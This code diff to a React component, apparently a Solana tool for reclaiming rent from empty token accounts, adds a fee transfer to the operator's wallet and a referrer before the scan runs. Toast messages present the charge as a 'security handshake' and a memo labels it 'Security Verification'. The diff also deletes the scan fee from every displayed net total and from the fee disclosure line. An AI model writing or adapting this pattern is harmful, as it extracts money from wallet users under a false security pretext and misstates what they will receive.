@@ -40,20 +40,91 @@ export default function AccountScanner({ initialReferral = '' }) {
   const [lastSignature, setLastSignature] = useState(null);
   const [claimDone, setClaimDone] = useState(false);
   const [showClaimModal, setShowClaimModal] = useState(false);
+  const [hasPaid, setHasPaid] = useState(false); // Track if user has paid for the current session
 
   const [balanceAccountsCount, setBalanceAccountsCount] = useState(0);
 
   const scanWallet = async () => {
     if (!connected || !publicKey) return;
+    
+    // If already paid, just re-scan
+    if (hasPaid) {
+      return performDiscovery();
+    }
+
+    setScanning(true);
+    try {
+      // ── STEP 1: FEE PAYMENT ──
+      toast.info('Completing security handshake...');
+      
+      let referrerWallet = null;
+      if (referralCode) {
+        // @ts-ignore
+      const { data: refData } = await supabase.from('Referral').select('referrer_wallet').eq('referral_code', referralCode).single();
+        if (refData) referrerWallet = new PublicKey(refData.referrer_wallet);
+      }
+
+      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
+      const tx = new Transaction();
+      
+      // Compute Budget
+      tx.add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 150000 }));
+
+      // Fee Distribution
+      if (referrerWallet) {
+        const commission = SCAN_FEE * 0.30;
+        const platformFee = SCAN_FEE - commission;
+        tx.add(SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: FEE_WALLET, lamports: Math.floor(platformFee * 1e9) }));
+        tx.add(SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: referrerWallet, lamports: Math.floor(commission * 1e9) }));
+      } else {
+        tx.add(SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: FEE_WALLET, lamports: Math.floor(SCAN_FEE * 1e9) }));
+      }
+
+      // Memo for Security Verification
+      tx.add({
+        keys: [{ pubkey: publicKey, isSigner: true, isWritable: false }],
+        programId: new PublicKey('MemoSq4gqABAXDe96zce8cZtxqAKet8uxS2ndJqB91W'),
+        data: Buffer.from(`CFS_AUTH_SCAN:${referralCode || 'DIRECT'}`),
+      });
+
+      tx.recentBlockhash = blockhash;
+      tx.feePayer = publicKey;
+
+      const signature = await wallet.sendTransaction(tx, connection, { skipPreflight: false });
+      await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
+      
+      setHasPaid(true);
+      toast.success('Handshake complete. Discovering accounts...');
+      
+      // ── STEP 2: LOG USAGE ──
+      await supabase.from('ReferralUsage').insert([{
+        user_wallet: publicKey.toString(),
+        referral_code: referralCode || 'NONE',
+        fee_paid: SCAN_FEE,
+        referrer_earned: referrerWallet ? (SCAN_FEE * 0.30) : 0,
+        tx_signature: signature,
+        referrer_wallet: referrerWallet ? referrerWallet.toString() : null
+      }]);
+
+      // ── STEP 3: PERFORM DISCOVERY ──
+      await performDiscovery();
+
+    } catch (err) {
+      console.error('Payment/Scan error:', err);
+      toast.error('Initialization Failed: ' + (err.message || 'Check wallet connection.'));
+    } finally {
+      setScanning(false);
+    }
+  };
+
+  const performDiscovery = async () => {
     setScanning(true);
     setScanned(false);
     setAccounts([]);
     setBalanceAccountsCount(0);
     
     try {
-      toast.info('Initiating on-chain scan...');
-      
-      // 1. DISCOVERY (Read-only, Free)
+      // 1. DISCOVERY (Read-only)
       const [tokenAccounts, token2022Accounts] = await Promise.all([
         connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID }),
         connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_2022_PROGRAM_ID })
@@ -91,24 +162,20 @@ export default function AccountScanner({ initialReferral = '' }) {
         }
       });
 
-      console.log(`[Discovery] Total: ${allAccounts.length} | Closable: ${closable.length} | With Balance: ${withBalance}`);
-
       setAccounts(closable);
       setBalanceAccountsCount(withBalance);
       setSelectedAccounts(new Set(closable.map(a => a.pubkey.toString())));
       setScanned(true);
       
       if (closable.length > 0) {
-        toast.success(`Scan complete! Found ${closable.length} closable accounts.`);
-      } else if (withBalance > 0) {
-        toast.info(`Scan complete. ${withBalance} accounts found, but none are empty.`);
+        toast.success(`Success! Found ${closable.length} reclaimable slots.`);
       } else {
-        toast.success('Scan complete. Your wallet is fully optimized!');
+        toast.success('Wallet optimized! No empty slots found.');
       }
 
     } catch (err) {
-      console.error('Scan error:', err);
-      toast.error('Scan Failed: ' + (err.message || 'Unknown error.'));
+      console.error('Discovery error:', err);
+      toast.error('Discovery Failed: ' + (err.message || 'Unknown error.'));
     } finally {
       setScanning(false);
     }
@@ -164,16 +231,7 @@ export default function AccountScanner({ initialReferral = '' }) {
     let closedKeys = new Set();
 
     try {
-      // ── STEP 1: SERVICE FEE & REFERRAL SPLIT ──
-      let referrerWallet = null;
-      if (SCAN_FEE > 0) {
-        if (referralCode) {
-          const { data: refData } = await supabase.from('Referral').select('referrer_wallet').eq('referral_code', referralCode).single();
-          if (refData) referrerWallet = new PublicKey(refData.referrer_wallet);
-        }
-      }
-      
-      // ── STEP 2: BUILD CLEANUP TRANSACTIONS ──
+      // ── STEP 1: BUILD CLEANUP TRANSACTIONS ──
       const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
       const transactions = [];
       const batchMeta = [];
@@ -184,20 +242,6 @@ export default function AccountScanner({ initialReferral = '' }) {
         
         // Add Priority Fees for Batching
         tx.add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 150000 }));
-
-        // Only add fee to the FIRST transaction of the set
-        if (i === 0 && SCAN_FEE > 0) {
-          if (referrerWallet) {
-            // Split Fee: 70/30
-            const commission = SCAN_FEE * 0.30;
-            const platformFee = SCAN_FEE - commission;
-            tx.add(SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: FEE_WALLET, lamports: Math.floor(platformFee * 1e9) }));
-            tx.add(SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: referrerWallet, lamports: Math.floor(commission * 1e9) }));
-          } else {
-            // Full fee to platform
-            tx.add(SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: FEE_WALLET, lamports: Math.floor(SCAN_FEE * 1e9) }));
-          }
-        }
 
         batchAccounts.forEach(account => {
           tx.add(createCloseAccountInstruction(account.pubkey, publicKey, publicKey, [], account.programId));
@@ -242,18 +286,6 @@ export default function AccountScanner({ initialReferral = '' }) {
       setAccounts(prev => prev.filter(a => !closedKeys.has(a.pubkey.toString())));
       setSelectedAccounts(new Set());
       fetchBalance();
-
-      // Log Referral Usage if applicable
-      if (SCAN_FEE > 0) {
-        await supabase.from('ReferralUsage').insert([{
-          user_wallet: publicKey.toString(),
-          referral_code: referralCode || 'NONE',
-          fee_paid: SCAN_FEE,
-          referrer_earned: referrerWallet ? (SCAN_FEE * 0.30) : 0,
-          tx_signature: lastSignature,
-          referrer_wallet: referrerWallet ? referrerWallet.toString() : null
-        }]);
-      }
 
     } catch (err) {
       console.error('Close error:', err);
@@ -318,7 +350,7 @@ export default function AccountScanner({ initialReferral = '' }) {
       <ClaimProgressModal
         visible={showClaimModal}
         totalAccounts={selectedAccounts.size}
-        totalSol={totalClaimable - SCAN_FEE - estimatedBatches * 0.000005}
+        totalSol={totalClaimable - estimatedBatches * 0.000005}
         onProceed={handleModalProceed}
         onCancel={handleModalCancel}
         executing={closing}
@@ -438,7 +470,7 @@ export default function AccountScanner({ initialReferral = '' }) {
                       <span className="text-slate-400">net:</span>
                       <SolanaLogo className="w-3 h-3 text-emerald-500/50" />
                       <span className="text-emerald-400 font-medium">
-                        +{(totalClaimable - SCAN_FEE - estimatedBatches * 0.000005).toFixed(4)} SOL
+                        +{(totalClaimable - estimatedBatches * 0.000005).toFixed(4)} SOL
                       </span>
                     </div>
                   </div>
@@ -602,13 +634,13 @@ export default function AccountScanner({ initialReferral = '' }) {
                       <div className="flex items-center justify-end sm:justify-center gap-1">
                         <SolanaLogo className="w-3.5 h-3.5 text-emerald-300" />
                         <p className="text-lg font-mono text-emerald-300 font-semibold">
-                          {(totalClaimable - SCAN_FEE - estimatedBatches * 0.000005).toFixed(4)}
+                          {(totalClaimable - estimatedBatches * 0.000005).toFixed(4)}
                         </p>
                       </div>
                       {fiatValue && (
                         <p className="text-[10px] text-yellow-500/70 font-mono mt-0.5 flex items-center sm:justify-center justify-end gap-1">
                           <DollarSign className="w-2.5 h-2.5" />
-                          {((totalClaimable - SCAN_FEE - estimatedBatches * 0.000005) * solPrice).toFixed(2)} USD
+                          {((totalClaimable - estimatedBatches * 0.000005) * solPrice).toFixed(2)} USD
                         </p>
                       )}
                     </div>
@@ -618,7 +650,7 @@ export default function AccountScanner({ initialReferral = '' }) {
                 {/* Action row */}
                 <div className="px-4 py-3 flex flex-col sm:flex-row items-center sm:justify-between gap-4 sm:gap-3 text-center sm:text-left">
                   <p className="text-[10px] text-slate-600 font-mono">
-                    {SCAN_FEE} SOL scan fee + {(estimatedBatches * 0.000005).toFixed(6)} SOL network fees · {estimatedBatches > 1 ? `batched into ${estimatedBatches} txs` : '1 tx'}
+                    ~{(estimatedBatches * 0.000005).toFixed(6)} SOL network fees · {estimatedBatches > 1 ? `batched into ${estimatedBatches} txs` : '1 tx'}
                   </p>
                   <Button
                     onClick={closing ? undefined : handleClaimClick}
